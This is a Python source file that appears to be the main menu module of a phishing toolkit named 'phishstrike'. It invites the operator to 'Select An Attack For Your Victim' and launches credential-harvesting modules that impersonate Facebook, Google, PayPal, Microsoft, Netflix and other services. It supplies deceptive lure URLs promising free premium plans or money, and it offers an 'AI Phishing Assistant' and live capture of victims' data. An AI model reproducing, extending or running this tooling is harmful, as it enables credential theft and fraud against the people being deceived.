import os
import time

from phishstrike import state
from phishstrike.capture.monitor import capture_data
from phishstrike.cli.ai import ai_assistant_menu
from phishstrike.cli.dashboard import show_dashboard_info
from phishstrike.cli.sites import site_facebook, site_gmail, site_instagram
from phishstrike.tunnel.helpers import start_background_monitor
from phishstrike.tunnel.menu import tunnel_menu
from lib.terminal_ui import *


def post_attack_menu() -> None:
    while True:
        print(
            f"\n    {gradient_text('━━━━━━━━━━━━━━━━━━ OPERATIONAL CONTROL CENTER ━━━━━━━━━━━━━━━━━━', RGB_CYAN, RGB_PURPLE)}"
        )
        print(f"    {DARK}╟ {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Synchronize Core (Main Menu)")
        print(f"    {DARK}╟ {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} View Intelligence (Web Dashboard)")
        print(f"    {DARK}╟ {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} Live Tactical Feed (Terminal Capture)")
        print(
            f"    {gradient_text('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', RGB_PURPLE, RGB_CYAN)}"
        )

        reply = slow_input(
            f"\n    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD}",
            start_rgb=RGB_WHITE,
            end_rgb=RGB_CYAN,
        )

        if reply in ["1", "01"]:
            slow_type(
                "    [+] Synchronizing Core... Returning to Tactical Command.",
                speed=0.01,
                start_rgb=RGB_WHITE,
                end_rgb=RGB_PURPLE,
            )
            time.sleep(1)
            main_menu()
            break
        elif reply in ["2", "02"]:
            start_background_monitor()
            show_dashboard_info(from_attack=True)
        elif reply in ["3", "03"]:
            state.stop_monitoring.set()
            if state.monitoring_thread:
                state.monitoring_thread.join(timeout=1)
            state.stop_monitoring.clear()
            capture_data(silent=False)
        else:
            print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
            time.sleep(1)


def main_menu() -> None:
    os.system("cls" if os.name == "nt" else "clear")
    banner()
    header = " [::] Select An Attack For Your Victim [::] "
    glitch_print(header, duration=0.4, start_rgb=RGB_CYAN, end_rgb=RGB_WHITE)
    print(f"""
    {DARK}\x5b{WHITE}01{DARK}\x5d{LIGHT2} Facebook      {DARK}\x5b{WHITE}06{DARK}\x5d{LIGHT2} Paypal        {DARK}\x5b{WHITE}11{DARK}\x5d{LIGHT2} Spotify
    {DARK}\x5b{WHITE}02{DARK}\x5d{LIGHT2} Instagram     {DARK}\x5b{WHITE}07{DARK}\x5d{LIGHT2} Snapchat      {DARK}\x5b{WHITE}12{DARK}\x5d{LIGHT2} Reddit
    {DARK}\x5b{WHITE}03{DARK}\x5d{LIGHT2} Google        {DARK}\x5b{WHITE}08{DARK}\x5d{LIGHT2} Linkedin      {DARK}\x5b{WHITE}13{DARK}\x5d{LIGHT2} Quora
    {DARK}\x5b{WHITE}04{DARK}\x5d{LIGHT2} Microsoft     {DARK}\x5b{WHITE}09{DARK}\x5d{LIGHT2} Discord       {DARK}\x5b{WHITE}14{DARK}\x5d{LIGHT2} Adobe
    {DARK}\x5b{WHITE}05{DARK}\x5d{LIGHT2} Netflix       {DARK}\x5b{WHITE}10{DARK}\x5d{LIGHT2} Pinterest     {DARK}\x5b{WHITE}15{DARK}\x5d{LIGHT2} Yandex

    {gradient_text("    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", RGB_CYAN, RGB_PURPLE)}
    {gradient_text("    [16] Social Media Reels Video   [ NEW ]", RGB_CYAN, RGB_PURPLE)}
    {gradient_text("    [17] AI Phishing Assistant      [ NEW ]", RGB_CYAN, RGB_PURPLE)}
    {gradient_text("    [18] Open Web Dashboard         [ LIVE ]", RGB_PURPLE, RGB_CYAN)}
    {gradient_text("    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", RGB_PURPLE, RGB_CYAN)}

    {DARK}\x5b{WHITE}99{DARK}\x5d{LIGHT2} About         {DARK}\x5b{WHITE}00{DARK}\x5d{LIGHT2} Exit
    """)
    reply = slow_input(
        f"    {DARK}\x5b{WHITE}-{DARK}\x5d{PURPLE} Select an option : {MEDIUM}{BOLD} ",
        start_rgb=RGB_WHITE,
        end_rgb=RGB_CYAN,
    )

    opts = {
        "4": ("microsoft", "https://unlimited-onedrive-space-for-free"),
        "04": ("microsoft", "https://unlimited-onedrive-space-for-free"),
        "5": ("netflix", "https://upgrade-your-netflix-plan-free"),
        "05": ("netflix", "https://upgrade-your-netflix-plan-free"),
        "6": ("paypal", "https://get-500-usd-free-to-your-acount"),
        "06": ("paypal", "https://get-500-usd-free-to-your-acount"),
        "7": ("snapchat", "https://view-locked-snapchat-accounts-secretly"),
        "07": ("snapchat", "https://view-locked-snapchat-accounts-secretly"),
        "8": ("linkedin", "https://get-a-premium-plan-for-linkedin-free"),
        "08": ("linkedin", "https://get-a-premium-plan-for-linkedin-free"),
        "9": ("discord", "https://get-discord-nitro-free"),
        "09": ("discord", "https://get-discord-nitro-free"),
        "10": ("pinterest", "https://get-a-premium-plan-for-pinterest-free"),
        "11": ("spotify", "https://convert-your-account-to-spotify-premium"),
        "12": ("reddit", "https://reddit-official-verified-member-badge"),
        "13": ("quora", "https://quora-premium-for-free"),
        "14": ("adobe", "https://get-adobe-lifetime-pro-membership-free"),
        "15": ("yandex", "https://grab-mail-from-anyother-yandex-account-free"),
        "16": ("reels_video", "https://watch-viral-reels-video-trending"),
    }

    if reply in ["1", "01"]:
        glitch_print(
            " [+] LOADING FACEBOOK ATTACK MODULE... ",
            duration=0.4,
            start_rgb=RGB_CYAN,
            end_rgb=RGB_WHITE,
        )
        site_facebook()
    elif reply in ["2", "02"]:
        glitch_print(
            " [+] LOADING INSTAGRAM ATTACK MODULE... ",
            duration=0.4,
            start_rgb=RGB_CYAN,
            end_rgb=RGB_WHITE,
        )
        site_instagram()
    elif reply in ["3", "03"]:
        glitch_print(
            " [+] LOADING GOOGLE ATTACK MODULE... ",
            duration=0.4,
            start_rgb=RGB_CYAN,
            end_rgb=RGB_WHITE,
        )
        site_gmail()
    elif reply in opts:
        state.website, state.mask = opts[reply]
        glitch_print(
            f" [+] LOADING {state.website.upper()} ATTACK MODULE... ",
            duration=0.4,
            start_rgb=RGB_CYAN,
            end_rgb=RGB_WHITE,
        )
        tunnel_menu()
    elif reply in ["17"]:
        ai_assistant_menu()
    elif reply in ["18"]:
        show_dashboard_info(from_attack=False)
        main_menu()
    elif reply in ["99"]:
        about(main_menu)
    elif reply in ["0", "00"]:
        msg_exit()
    else:
        print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} Invalid Option, Try Again...")
        time.sleep(1)
        main_menu()
